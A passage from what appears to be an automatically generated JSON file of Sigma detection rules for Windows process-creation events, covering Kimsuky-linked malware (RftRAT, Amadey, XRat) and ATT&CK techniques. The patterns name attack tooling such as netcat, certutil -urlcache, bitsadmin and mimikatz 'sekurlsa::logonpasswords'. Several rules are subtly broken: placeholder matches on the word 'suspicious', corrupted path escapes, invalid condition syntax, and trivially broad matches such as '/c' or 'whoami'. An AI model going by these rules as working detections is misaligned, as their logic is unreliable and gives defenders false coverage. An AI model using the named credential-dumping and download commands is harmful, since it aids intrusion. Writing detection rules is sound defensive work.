            "Software deployment tools invoking rundll32 or regsvr32 with network-accessing scripts",
            "Internal monitoring tools executing commands via high-privilege processes"
          ],
          "level": "high",
          "tags": [
            "attack.defense_evasion",
            "attack.t1055",
            "detection.emulation",
            "behavioral.anomaly",
            "custom.process_injection"
          ],
          "ttp_id": "unknown",
          "technique_name": "Process Injection",
          "generation_method": "langchain",
          "id": "5009d9ce-d0de-4c64-9c85-99d44ef8a0fb"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Data Staging",
        "status": "success",
        "rule": {
          "title": "Infostealer Creation by RftRAT",
          "description": "Detects the creation of an infostealer by RftRAT as part of Data Staging tactic under Credential Access",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection": {
              "CommandLine|contains": [
                "Infostealer",
                "--stage",
                "-encode",
                "-compress",
                "pack"
              ],
              "Image|endswith": [
                "\\cmd.exe",
                "\\powershell.exe",
                "\\wscript.exe",
                "\\cscript.exe",
                "\\mshta.exe"
              ]
            },
            "condition": "selection"
          },
          "falsepositives": [
            "Legitimate software packaging or compression tools using similar command-line arguments",
            "Administrative scripts performing data archiving or encoding",
            "Developer tools that use packing or encoding for legitimate purposes"
          ],
          "level": "high",
          "tags": [
            "attack.credential-access",
            "attack.t1074",
            "malware.infostealer",
            "custom.rftRAT"
          ],
          "ttp_id": "unknown",
          "technique_name": "Data Staging",
          "generation_method": "langchain",
          "id": "1ad9dd96-ef7e-4654-a821-769e7eaed40b"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Obfuscated Files or Information",
        "status": "success",
        "rule": {
          "title": "VMP Packed RftRAT Obfuscation",
          "description": "Detects RftRAT packed with VMProtect (VMP) through process creation with obfuscated command-line characteristics",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection": {
              "CommandLine|contains": "VMP"
            },
            "condition": "selection"
          },
          "falsepositives": [
            "Legitimate software development or reverse engineering tools using VMProtect for code protection"
          ],
          "level": "high",
          "tags": [
            "attack.defense-evasion",
            "attack.T1027",
            "malware.rat",
            "custom.rftRAT",
            "custom.vmpacked"
          ],
          "ttp_id": "unknown",
          "technique_name": "Obfuscated Files or Information",
          "generation_method": "langchain",
          "id": "ea5a7a6f-70f6-48a7-ae07-0ea93cbdf11f"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "File Deletion",
        "status": "success",
        "rule": {
          "title": "RftRAT File Deletion via Command Line",
          "description": "Detects RftRAT using file deletion functionality by identifying suspicious command-line patterns associated with file deletion on Windows systems.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_cmd_delete": {
              "Image|endswith": "\\cmd.exe",
              "CommandLine|contains": "0x06"
            },
            "selection_powershell_remove": {
              "Image|endswith": "\\powershell.exe",
              "CommandLine|contains": "0x06"
            },
            "selection_any_process_hex": {
              "CommandLine|contains": "delete"
            },
            "condition": "selection_cmd_delete or selection_powershell_remove or selection_any_process_hex"
          },
          "falsepositives": [
            "Legitimate system cleanup scripts using 'del' or 'Remove-Item' with hexadecimal arguments",
            "Administrative automation tasks involving file removal with encoded parameters"
          ],
          "level": "high",
          "tags": [
            "attack.defense_evasion",
            "attack.T1107",
            "malware.rat.rfrat"
          ],
          "ttp_id": "unknown",
          "technique_name": "File Deletion",
          "generation_method": "langchain",
          "id": "ecd70220-0a29-4f4d-b4b2-bc00c77e10a4"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Application Layer Protocol",
        "status": "success",
        "rule": {
          "title": "Application Layer Protocol Activity via NLP Pattern Matching",
          "description": "Detects Application Layer Protocol activity through behavioral patterns and command-line characteristics indicative of C2 communication, using NLP-based detection logic.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_cmd": {
              "Image|endswith": "\\cmd.exe",
              "CommandLine|contains": "/c"
            },
            "selection_powershell": {
              "Image|endswith": "\\powershell.exe",
              "CommandLine|contains": "-enc"
            },
            "selection_certutil": {
              "Image|endswith": "\\certutil.exe",
              "CommandLine|contains": "-urlcache"
            },
            "selection_bitsadmin": {
              "Image|endswith": "\\bitsadmin.exe",
              "CommandLine|contains": "AddJob"
            },
            "selection_curl": {
              "Image|endswith": "\\curl.exe",
              "CommandLine|contains": "http"
            },
            "selection_wget": {
              "Image|endswith": "\\wget.exe",
              "CommandLine|contains": "http"
            },
            "condition": "selection_cmd or selection_powershell or selection_certutil or selection_bitsadmin or selection_curl or selection_wget"
          },
          "falsepositives": [
            "Legitimate administrative use of command-line tools for downloading files",
            "Automated scripts using certutil or bitsadmin for caching updates",
            "Development or testing activities involving HTTP requests from command line"
          ],
          "level": "high",
          "tags": [
            "attack.t1071",
            "attack.c2",
            "detection.emulation",
            "behavioral.anomalous-cli-usage"
          ],
          "ttp_id": "unknown",
          "technique_name": "Application Layer Protocol",
          "generation_method": "langchain",
          "id": "ff75047f-eb96-488c-8977-385821cf303e"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Exfiltration Over C2 Channel",
        "status": "success",
        "rule": {
          "title": "Exfiltration Over C2 Channel Detected via NLP Pattern Matching",
          "description": "Detected Exfiltration Over C2 Channel activity via NLP pattern matching indicating potential data exfiltration through command-and-control infrastructure",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_cmd_http": {
              "Image|endswith": "\\cmd.exe",
              "CommandLine|contains": " /c "
            },
            "selection_powershell": {
              "Image|endswith": "\\powershell.exe",
              "CommandLine|contains": "-enc"
            },
            "selection_certutil": {
              "Image|endswith": "\\certutil.exe",
              "CommandLine|contains": "-decode"
            },
            "selection_bitsadmin": {
              "Image|endswith": "\\bitsadmin.exe",
              "CommandLine|contains": "Transfer"
            },
            "selection_net_use": {
              "Image|endswith": "\\net.exe",
              "CommandLine|contains": "use"
            },
            "selection_ftp": {
              "Image|endswith": "\\ftp.exe",
              "CommandLine|contains": "open"
            },
            "condition": "selection_cmd_http or selection_powershell or selection_certutil or selection_bitsadmin or selection_net_use or selection_ftp"
          },
          "falsepositives": [
            "Legitimate administrative use of certutil, bitsadmin, or net commands",
            "Automated scripts using command-line utilities for maintenance",
            "Software deployment tools using network transfer utilities"
          ],
          "level": "high",
          "tags": [
            "attack.exfiltration",
            "attack.T1041"
          ],
          "ttp_id": "unknown",
          "technique_name": "Exfiltration Over C2 Channel",
          "generation_method": "langchain",
          "id": "d0c3b6d6-ef9c-402f-a4d1-b8451b2e8116"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Exploit Public-Facing Application",
        "status": "success",
        "rule": {
          "title": "Exploit Public-Facing Application via NLP Pattern Matching",
          "description": "Detected Exploit Public-Facing Application activity via NLP pattern matching indicating potential exploitation of a public-facing service such as web servers, databases, or other internet-accessible applications.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_cmd_params": {
              "CommandLine|contains": [
                "/c",
                "&&",
                "|"
              ]
            },
            "selection_suspicious_keywords": {
              "CommandLine|contains": [
                "nc",
                "netcat",
                "powershell",
                "cmd",
                "wget",
                "curl",
                "tftp",
                "certutil",
                "regsvr32",
                "bitsadmin",
                "mshta",
                "cscript",
                "wscript"
              ]
            },
            "selection_parent_network_process": {
              "ParentImage|endswith": [
                "\\httpd.exe",
                "\nginx.exe",
                "\\mysqld.exe",
                "\tomcat.exe",
                "\\w3wp.exe",
                "\\svchost.exe"
              ]
            },
            "condition": "selection_cmd_params and selection_suspicious_keywords and selection_parent_network_process"
          },
          "falsepositives": [
            "Legitimate administrative scripts executed by system or application services",
            "Automated maintenance tasks initiated by web server processes",
            "Software updates or patching routines using command-line tools"
          ],
          "level": "high",
          "tags": [
            "attack.initial_access",
            "attack.T1190",
            "detection.emerging",
            "behavioral.anomaly"
          ],
          "ttp_id": "unknown",
          "technique_name": "Exploit Public-Facing Application",
          "generation_method": "langchain",
          "id": "bb9e6b10-7f83-4521-9436-f2a3ba9e213a"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "OS Credential Dumping",
        "status": "success",
        "rule": {
          "title": "OS Credential Dumping Detection via NLP Pattern Matching",
          "description": "Detected OS Credential Dumping activity via NLP pattern matching indicating potential credential access attempts using known malicious process behaviors.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_cmd": {
              "Image|endswith": "\\cmd.exe",
              "CommandLine|contains": "whoami"
            },
            "selection_powershell": {
              "Image|endswith": "\\powershell.exe",
              "CommandLine|contains": "Get-ADUser"
            },
            "selection_lsass_access": {
              "Image|endswith": "\\procdump.exe",
              "CommandLine|contains": "lsass"
            },
            "selection_mimikatz": {
              "CommandLine|contains": "sekurlsa::logonpasswords"
            },
            "condition": "selection_cmd or selection_powershell or selection_lsass_access or selection_mimikatz"
          },
          "falsepositives": [
            "Legitimate administrative scripts using 'whoami' or 'Get-ADUser'",
            "Authorized memory dumping tools used by system administrators",
            "Penetration testing activities with proper approval"
          ],
          "level": "high",
          "tags": [
            "attack.credential_access",
            "attack.t1003",
            "detection.rule.os_credential_dumping",
            "custom.windows",
            "custom.sysmon"
          ],
          "ttp_id": "unknown",
          "technique_name": "OS Credential Dumping",
          "generation_method": "langchain",
          "id": "4b8fef8c-9f69-4528-ba9d-34a8fe7cf5fe"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Archive Collected Data",
        "status": "success",
        "rule": {
          "title": "Archive Collected Data via Command-Line Archiving Tools",
          "description": "Detects archiving of collected data using command-line tools commonly abused by adversaries to bundle exfiltrated files. Matches on known archiving utilities and their common command-line arguments used in malicious contexts.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_archive_tools": {
              "Image|endswith": [
                "\\zip.exe",
                "\\rar.exe",
                "\\7z.exe",
                "\\tar.exe",
                "\\compress.exe"
              ],
              "CommandLine|contains": [
                "-r",
                "-a",
                "--recurse",
                "*.zip",
                "*.rar",
                "*.7z",
                "*.tar",
                "*.gz"
              ]
            },
            "selection_powershell_compress": {
              "Image|endswith": "\\powershell.exe",
              "CommandLine|contains": [
                "Compress-Archive",
                "-Path",
                "-DestinationPath",
                "\\AppData\\",
                "\\Local\\",
                "\\Temp\\"
              ]
            },
            "selection_wmic_archive": {
              "ParentImage|endswith": "\\wmic.exe",
              "Image|endswith": [
                "\\zip.exe",
                "\\7z.exe"
              ]
            },
            "condition": "selection_archive_tools or selection_powershell_compress or selection_wmic_archive"
          },
          "falsepositives": [
            "Legitimate administrative use of archiving tools for backup or deployment",
            "Automated scripts compressing logs or temporary data",
            "Software installers bundling files during setup"
          ],
          "level": "medium",
          "tags": [
            "attack.collection",
            "attack.T1560",
            "custom.windows",
            "custom.sysmon",
            "custom.command-line-archiving"
          ],
          "ttp_id": "unknown",
          "technique_name": "Archive Collected Data",
          "generation_method": "langchain",
          "id": "e2074666-b304-43b2-84b6-7600530afc21"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Input Capture",
        "status": "success",
        "rule": {
          "title": "Detected Input Capture Activity via NLP Pattern Matching",
          "description": "Detects potential input capture activity by identifying suspicious processes or command-line patterns associated with capturing user input, such as keyboard logging or screen capture tools, using behavioral indicators and command-line artifacts.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection": {
              "CommandLine|contains": "suspicious"
            },
            "condition": "selection"
          },
          "falsepositives": [
            "Legitimate system monitoring tools",
            "Administrative scripts using logging functions",
            "Developer testing of input handling",
            "Office documents spawning command-line utilities for legitimate automation"
          ],
          "level": "high",
          "tags": [
            "attack.credential_access",
            "attack.t1056",
            "detection.emulation",
            "behavioral.anomaly"
          ],
          "ttp_id": "unknown",
          "technique_name": "Input Capture",
          "generation_method": "langchain",
          "id": "5f7789be-bdc8-4bba-b669-e0c31c74ca06"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Screen Capture",
        "status": "success",
        "rule": {
          "title": "Screen Capture Activity Detected via NLP Pattern Matching",
          "description": "Detects screen capture activity by identifying processes commonly associated with taking screenshots or recording the screen, using command-line arguments and image paths indicative of screen capture tools.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection": {
              "CommandLine|contains": "suspicious"
            },
            "condition": "selection"
          },
          "falsepositives": [
            "Legitimate system monitoring or automation scripts that capture UI elements for diagnostics or accessibility purposes",
            "Administrative tools using PowerShell or command-line utilities to capture screen for remote support (e.g., via RDP or remote assistance tools)",
            "Development or testing tools that programmatically capture screen output for UI validation"
          ],
          "level": "high",
          "tags": [
            "attack.collection",
            "attack.T1113",
            "custom.screen_capture",
            "custom.suspicious_process_behavior",
            "custom.command_line_anomalies"
          ],
          "ttp_id": "unknown",
          "technique_name": "Screen Capture",
          "generation_method": "langchain",
          "id": "50ae37b0-b4c9-4cb5-b4d7-ce6a8af289c1"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Remote Desktop Protocol",
        "status": "success",
        "rule": {
          "title": "Remote Desktop Protocol Activity Detected via Behavioral Indicators",
          "description": "Detects Remote Desktop Protocol (RDP) activity through process creation and network connection patterns indicative of lateral movement. Detection based on common RDP client usage and associated command-line parameters.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_rdp_process": {
              "Image|endswith": [
                "\\mstsc.exe",
                "\\tsclient.exe"
              ]
            },
            "selection_rdp_command": {
              "CommandLine|contains": [
                "/v:",
                "/admin",
                "/f",
                "/w:",
                "/h:",
                "-v",
                "-admin"
              ]
            },
            "selection_network": {
              "Image|endswith": [
                "\\svchost.exe",
                "\\lsass.exe"
              ],
              "CommandLine|contains": [
                "termservice",
                "RemoteDesktop"
              ]
            },
            "condition": "selection_rdp_process or selection_rdp_command or selection_network"
          },
          "falsepositives": [
            "Legitimate administrative use of RDP by IT staff",
            "Remote support sessions initiated by users",
            "Automated RDP-based monitoring tools",
            "RDP connections via Microsoft Azure Bastion or other cloud management platforms"
          ],
          "level": "high",
          "tags": [
            "attack.t1021.001",
            "attack.lateral_movement",
            "custom.windows",
            "custom.rdp",
            "custom.lateral_movement",
            "custom.mstsc"
          ],
          "ttp_id": "unknown",
          "technique_name": "Remote Desktop Protocol",
          "generation_method": "langchain",
          "id": "f2f2b5b6-90bd-48c0-bad7-74ece7a420ee"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "User Execution: Malicious File",
        "status": "success",
        "rule": {
          "title": "User Execution: Malicious File",
          "description": "Detects User Execution: Malicious File activity via behavioral patterns in process creation events, focusing on suspicious child processes spawned from common document handlers and use of encoded or download-related command-line arguments.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_office_spawn": {
              "ParentImage|endswith": [
                "\\WINWORD.EXE",
                "\\EXCEL.EXE",
                "\\POWERPNT.EXE",
                "\\OUTLOOK.EXE"
              ],
              "Image|endswith": [
                "\\cmd.exe",
                "\\powershell.exe",
                "\\pwsh.exe",
                "\\cscript.exe",
                "\\wscript.exe"
              ]
            },
            "selection_script_host": {
              "ParentImage|endswith": [
                "\\mshta.exe",
                "\\rundll32.exe",
                "\\regsvr32.exe"
              ],
              "Image|endswith": [
                "\\cmd.exe",
                "\\powershell.exe",
                "\\pwsh.exe",
                "\\cscript.exe",
                "\\wscript.exe",
                "\\mshta.exe",
                "\\rundll32.exe",
                "\\regsvr32.exe"
              ]
            },
            "selection_encoded": {
              "CommandLine|contains": [
                "-enc",
                "-encodedcommand",
                "-e",
                "-exec",
                "Bypass"
              ],
              "Image|endswith": [
                "\\powershell.exe",
                "\\pwsh.exe"
              ]
            },
            "selection_download": {
              "CommandLine|contains": [
                "Invoke-WebRequest",
                "wget",
                "curl",
                "certutil",
                "bitsadmin",
                "-out"
              ],
              "Image|endswith": [
                "\\powershell.exe",
                "\\cmd.exe"
              ]
            },
            "selection_suspicious_path": {
              "Image|contains": [
                "%TEMP%",
                "%APPDATA%",
                "%LOCALAPPDATA%"
              ],
              "CommandLine|contains": [
                ".exe",
                ".dll",
                ".js",
                ".vbs"
              ]
            },
            "condition": "selection_office_spawn or selection_script_host or selection_encoded or selection_download or selection_suspicious_path"
          },
          "falsepositives": [
            "Legitimate administrative scripts using encoded commands or spawning shells from office applications",
            "Software installers that extract and execute binaries from temporary directories",
            "Authorized use of certutil or bitsadmin for file downloads"
          ],
          "level": "high",
          "tags": [
            "attack.execution",
            "attack.t1204.002"
          ],
          "ttp_id": "unknown",
          "technique_name": "User Execution: Malicious File",
          "generation_method": "langchain",
          "id": "f48e9a06-4f2f-44ae-9207-1ccda997ed63"
        },
        "generation_method": "langchain"
      }
    ],
    "rules": [
      {
        "title": "Remote Control Malware Execution by Kimsuky Group",
        "description": "Detects execution of remote control malware associated with the Kimsuky group, including custom and open-source tools such as XRat, HVNC, Amadey, and Metasploit Meterpreter. Focuses on process creation events with suspicious command-line arguments or image paths indicative of remote access tools.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_xrat": {
            "Image|endswith": [
              "\\xrat.exe",
              "\\xratclient.exe"
            ],
            "CommandLine|contains": [
              "-connect",
              "-host",
              "-ip"
            ]
          },
          "selection_hvnc": {
            "Image|endswith": [
              "\\hvnc.exe",
              "\\hiddenvnc.exe"
            ],
            "CommandLine|contains": [
              "-ip",
              "-port",
              "connect"
            ]
          },
          "selection_amadey": {
            "Image|endswith": [
              "\\amadey.exe",
              "\\loader.exe"
            ],
            "CommandLine|contains": [
              "/c",
              "/staged",
              "beacon"
            ]
          },
          "selection_meterpreter": {
            "ParentImage|endswith": [
              "\\spoolsv.exe",
              "\\dllhost.exe",
              "\\wmiprvse.exe"
            ],
            "CommandLine|contains": [
              "-M",
              "--Meterpreter",
              "stageless"
            ]
          },
          "selection_generic_rat": {
            "CommandLine|contains": [
              "-connect",
              "reverse_shell",
              "--bind",
              "--reverse",
              "-R"
            ],
            "Image|endswith": [
              ".exe"
            ],
            "Image|contains": [
              "client",
              "remote",
              "control",
              "session"
            ]
          },
          "condition": "selection_xrat or selection_hvnc or selection_amadey or selection_meterpreter or selection_generic_rat"
        },
        "falsepositives": [
          "Legitimate remote administration tools used in enterprise environments (e.g., TeamViewer, AnyDesk, VNC) if named similarly",
          "Penetration testing activities using Metasploit or similar frameworks",
          "Custom internal tools with generic names like 'client.exe' or 'remote.exe' that include 'control' in path"
        ],
        "level": "high",
        "tags": [
          "attack.t1071.001",
          "attack.t1573",
          "attack.t1055",
          "attack.t1090",
          "threat-group.kimsuky",
          "malware.remote_access",
          "sigma.rule"
        ],
        "ttp_id": "unknown",
        "technique_name": "Remote Control Malware",
        "generation_method": "langchain",
        "id": "e91568c2-0c4e-4546-a2f1-2ba5a6e30fad"
      },
      {
        "title": "Kimsuky Group Spear Phishing Attack via LNK and Compressed Files",
        "description": "Detects spear phishing attacks associated with the Kimsuky group using LNK shortcut files and compressed archives to initiate initial access, particularly targeting defense, diplomatic, and academic sectors. Focuses on suspicious process creation patterns from email-adjacent activity.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_lnk_execution": {
            "Image|endswith": "\\cmd.exe",
            "ParentImage|endswith": "\\explorer.exe",
            "CommandLine|contains": ".lnk"
          },
          "selection_compressed_exec": {
            "CommandLine|contains": [
              "cmd.exe",
              "powershell.exe",
              "wscript.exe",
              "rundll32.exe"
            ]
          },
          "selection_office_spawn_shell": {
            "ParentImage|endswith": "\\WINWORD.EXE",
            "Image|endswith": [
              "\\cmd.exe",
              "\\powershell.exe",
              "\\wscript.exe",
              "\\rundll32.exe"
            ]
          },
          "condition": "selection_lnk_execution or selection_compressed_exec or selection_office_spawn_shell"
        },
        "falsepositives": [
          "Legitimate user execution of compressed scripts from trusted sources",
          "Administrative use of command-line tools after opening email attachments",
          "Automated document processing systems that spawn shells from Office applications"
        ],
        "level": "high",
        "tags": [
          "attack.t1566",
          "attack.initial_access",
          "threat.kimsuky",
          "phishing.spear",
          "custom.lnk_attack",
          "custom.compressed_payload"
        ],
        "ttp_id": "unknown",
        "technique_name": "Spear Phishing Attack",
        "generation_method": "langchain",
        "id": "eea49885-0a6d-446e-82dd-13af19fcb895"
      },
      {
        "title": "LNK Malware Execution with Script Decompression",
        "description": "Detects LNK file execution that triggers decompression of encrypted archives followed by execution of script-based malware. This behavior is commonly observed in LNK-based malware payloads that embed compressed malicious scripts.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_lnk_execution": {
            "Image|endswith": "\\cmd.exe",
            "ParentImage|endswith": "\\explorer.exe"
          },
          "selection_decompression": {
            "CommandLine|contains": "-r"
          },
          "selection_script_execution": {
            "CommandLine|contains": "powershell"
          },
          "condition": "selection_lnk_execution and selection_decompression and selection_script_execution"
        },
        "falsepositives": [
          "Legitimate use of LNK files to launch scripts via command line utilities",
          "Administrative scripts that use expand command for legitimate archive extraction"
        ],
        "level": "high",
        "tags": [
          "attack.execution",
          "attack.t1204.002",
          "attack.g0071",
          "malware.lnk",
          "malware.compression"
        ],
        "ttp_id": "unknown",
        "technique_name": "LNK Malware",
        "generation_method": "langchain",
        "id": "e67002f7-30ff-45ef-95ef-913cce5c63c2"
      },
      {
        "title": "Persistence Script and Downloader Execution",
        "description": "Detects execution of a persistence script and a downloader that retrieves and executes additional payloads from an external source. This behavior is associated with persistence and initial access tactics.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_persistence": {
            "CommandLine|contains": [
              "persistence script",
              "script for maintaining persistence"
            ]
          },
          "selection_downloader": {
            "CommandLine|contains": [
              "downloader",
              "downloads and executes additional payloads"
            ]
          },
          "condition": "selection_persistence or selection_downloader"
        },
        "falsepositives": [
          "Legitimate system administration scripts that reference persistence mechanisms or download tools for patching/maintenance",
          "Automated update scripts that download and execute payloads in secure environments"
        ],
        "level": "high",
        "tags": [
          "attack.persistence",
          "attack.t1053",
          "attack.t1071",
          "attack.command_and_control"
        ],
        "ttp_id": "unknown",
        "technique_name": "Persistence",
        "generation_method": "langchain",
        "id": "4aa8efd7-96cd-4b46-b867-fcf641f0bb26"
      },
      {
        "title": "Proxy Malware Establishing RDP Connection",
        "description": "Detects proxy malware establishing an RDP connection to a private network by leveraging suspicious executable and configuration file patterns.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_image": {
            "Image|endswith": "\\svc.exe"
          },
          "selection_config": {
            "CommandLine|contains": "setting.ini"
          },
          "selection_port": {
            "CommandLine|contains": "3389"
          },
          "condition": "selection_image and selection_config and selection_port"
        },
        "falsepositives": [
          "Legitimate service binaries named svc.exe running with configuration files and RDP-related command-line arguments (rare)",
          "Administrative scripts managing RDP connections using non-standard executables"
        ],
        "level": "high",
        "tags": [
          "attack.t1090",
          "attack.command-and-control",
          "custom.proxy",
          "custom.rdp",
          "custom.malware"
        ],
        "ttp_id": "unknown",
        "technique_name": "Proxy",
        "generation_method": "langchain",
        "id": "1a06f7e6-e8d8-4161-bbc0-3c5fd129a0bf"
      },
      {
        "title": "Amadey Malware Persistence via svc.vbs in Startup Folder",
        "description": "Detects Amadey malware persistence mechanism by creating 'svc.vbs' script in the %ALLUSERSPROFILE%\\Startup directory",
        "logsource": {
          "category": "file_event",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection": {
            "TargetFilename|endswith": "\\Startup\\svc.vbs",
            "Image|endswith": "\\svchost.exe"
          },
          "condition": "selection"
        },
        "falsepositives": [
          "Legitimate administrative scripts placed in the All Users Startup folder (rare)",
          "Manual creation of a file named svc.vbs in the Startup directory by a user or administrator"
        ],
        "level": "high",
        "tags": [
          "attack.persistence",
          "attack.T1547.005",
          "malware.amadey"
        ],
        "ttp_id": "unknown",
        "technique_name": "Persistence",
        "generation_method": "langchain",
        "id": "65864945-717b-49ee-ba19-2fbd8da9ddbb"
      },
      {
        "title": "Remote Control Malware Execution by Kimsuky Group",
        "description": "Detects execution of remote control malware such as RftRAT and Amadey used by Kimsuky Group for command and control activities. Focuses on suspicious process creation patterns and command-line indicators.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_rfterat": {
            "Image|endswith": [
              "\\rftRAT.exe",
              "\\RftRAT.exe"
            ],
            "CommandLine|contains": [
              "-k",
              "-c",
              "cmd",
              "powershell"
            ]
          },
          "selection_amadey": {
            "Image|endswith": [
              "\\Amadey.exe",
              "\\amadey.exe"
            ],
            "CommandLine|contains": [
              "/stext",
              "/c",
              "cmd",
              "powershell",
              "-enc"
            ]
          },
          "selection_generic_behavior": {
            "ParentImage|endswith": [
              "\\winword.exe",
              "\\excel.exe",
              "\\outlook.exe"
            ],
            "Image|endswith": [
              "\\cmd.exe",
              "\\powershell.exe",
              "\\wscript.exe",
              "\\rundll32.exe"
            ],
            "CommandLine|contains": [
              "-enc",
              "/c",
              "Invoke-Expression",
              "IEX",
              "cmd /k"
            ]
          },
          "condition": "selection_rfterat or selection_amadey or (selection_generic_behavior and not (Image|endswith='\\cmd.exe' and CommandLine|contains='\\start'))"
        },
        "falsepositives": [
          "Legitimate administrative scripts executed from Office applications",
          "User-initiated command-line tools after opening documents from trusted sources",
          "Software installers that temporarily execute scripts from system directories"
        ],
        "level": "high",
        "tags": [
          "attack.t1071.004",
          "attack.command-and-control",
          "malware.rat",
          "group.kimsuky",
          "detection.remote-control-malware"
        ],
        "ttp_id": "unknown",
        "technique_name": "Remote Control Malware",
        "generation_method": "langchain",
        "id": "54aac7b5-3f9b-49d7-90fe-80055b6b30e8"
      },
      {
        "title": "Persistence via ALLUSERSPROFILE Startup Directory",
        "description": "Detects persistence by placing an executable in the ALLUSERSPROFILE\\Startup directory, which executes when any user logs in. This technique leverages the Windows startup folder for persistence.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection": {
            "Image|endswith": "\\NsiService.exe",
            "Image|contains": "%ALLUSERSPROFILE%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
          },
          "condition": "selection"
        },
        "falsepositives": [
          "Legitimate software or scripts placed in the startup directory by system administrators",
          "User-initiated programs added to startup for convenience"
        ],
        "level": "high",
        "tags": [
          "attack.persistence",
          "attack.T1547.001",
          "custom.windows",
          "custom.startup_folder"
        ],
        "ttp_id": "unknown",
        "technique_name": "Persistence",
        "generation_method": "langchain",
        "id": "51e3dcd9-192f-4377-9795-909c8734e588"
      },
      {
        "title": "VMP Packed ht.dll Loader with Configuration File Access",
        "description": "Detects a VMP packed loader that reads and decrypts htsetting.ini file in the same directory, commonly associated with malicious ht.dll loaders used for code obfuscation and defense evasion.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_image": {
            "Image|endswith": "\\ht.dll"
          },
          "selection_config": {
            "CommandLine|contains": "htsetting.ini"
          },
          "selection_packed": {
            "Image|contains": "VMP"
          },
          "condition": "selection_image and selection_config and selection_packed"
        },
        "falsepositives": [
          "Legitimate software packed with VMProtect for license protection",
          "Custom applications using ht.dll for non-malicious purposes",
          "Development tools loading configuration files with similar naming patterns"
        ],
        "level": "high",
        "tags": [
          "attack.defense_evasion",
          "attack.T1027",
          "threat-group.confidential"
        ],
        "ttp_id": "unknown",
        "technique_name": "Code Obfuscation",
        "generation_method": "langchain",
        "id": "1df1f4de-e732-4380-9162-2a1ff056255f"
      },
      {
        "title": "Kimsuky AutoIt-based XRat Loader Detection",
        "description": "Detects Kimsuky group's use of AutoIt to create and execute XRat malware through process creation events. Focuses on AutoIt execution with XRat-related command-line indicators.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_autoit": {
            "Image|endswith": [
              "\\autoit3.exe",
              "\\AutoIt3_x64.exe"
            ],
            "CommandLine|contains": "XRat"
          },
          "condition": "selection_autoit"
        },
        "falsepositives": [
          "Legitimate use of AutoIt scripts containing 'XRat' as a variable or string in non-malicious context",
          "Developer or testing environments using AutoIt with XRat-named payloads for benign purposes"
        ],
        "level": "high",
        "tags": [
          "attack.defense_evasion",
          "attack.T1204.002",
          "threat-group.kimsuky",
          "malware.xrat",
          "tool.autoit"
        ],
        "ttp_id": "unknown",
        "technique_name": "Loader",
        "generation_method": "langchain",
        "id": "3110c81d-4dad-4cd0-809d-35b41f73fda0"
      },
      {
        "title": "Amadey Malware Execution via Rundll32.exe",
        "description": "Detects execution of Amadey malware through the Rundll32.exe process, a common technique used to load malicious DLLs in memory.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection": {
            "Image|endswith": "\\rundll32.exe",
            "CommandLine|contains": "\\"
          },
          "condition": "selection"
        },
        "falsepositives": [
          "Legitimate software using rundll32.exe to load DLLs from system directories",
          "Administrative scripts invoking rundll32.exe with custom command lines",
          "Software installers or updaters that leverage rundll32.exe"
        ],
        "level": "high",
        "tags": [
          "attack.execution",
          "malware.amadey",
          "custom.windows",
          "custom.rundll32"
        ],
        "ttp_id": "unknown",
        "technique_name": "Execution",
